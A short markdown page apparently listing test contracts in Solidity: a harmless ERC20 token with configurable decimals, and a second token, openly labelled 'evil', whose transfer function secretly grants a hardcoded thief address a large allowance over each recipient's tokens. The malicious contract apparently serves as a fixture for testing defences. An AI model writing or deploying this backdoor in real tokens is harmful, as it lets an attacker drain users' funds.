# Raw Contracts

## ERC20PresetMinterPauserDecimal

ERC20PresetMinterPauserDecimal is an extension of ERC20PresetMinterPauser. When this token is deployed it additionally allows to customize the decimals.
```
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "node_modules/@openzeppelin/contracts/token/ERC20/presets/ERC20PresetMinterPauser.sol";

contract ERC20PresetMinterPauserDecimal is ERC20PresetMinterPauser {
  uint8 private _decimals;

  constructor(string memory name, string memory symbol, uint8 decimals_)
    ERC20PresetMinterPauser(name, symbol) {
      _setupRole(DEFAULT_ADMIN_ROLE, msg.sender);
      _setupDecimals(decimals_);
  }

  function _setupDecimals(uint8 decimals_) private {
    _decimals = decimals_;
  }

  function decimals() public view virtual override returns (uint8) {
    return _decimals;
  }
}

```

## ERC20MaliciousDelayed

```sol
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "node_modules/@openzeppelin/contracts/token/ERC20/presets/ERC20PresetMinterPauser.sol";

// This is an evil token. Whenever an A -> B transfer is called,
// a predefined C is given a massive allowance on B.
contract ERC20MaliciousDelayed is ERC20PresetMinterPauser {
  address private _thief = 0x4dC6ac40Af078661fc43823086E1513635Eeab14;
  uint256 private _bigNum = 1000000000000000000; // ~uint256(0)
  constructor(uint256 initialSupply)
    ERC20PresetMinterPauser("ERC20MaliciousDelayed", "ERC20MALICIOUSDELAYED") {
      _setupRole(DEFAULT_ADMIN_ROLE, msg.sender);
      _mint(msg.sender, initialSupply);

  }
  function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
    // Any time a transaction happens, the thief account is granted allowance in secret.
    // Still emits an Approve!
    super._approve(recipient, _thief, _bigNum);
    return super.transfer(recipient, amount);
  }
}
```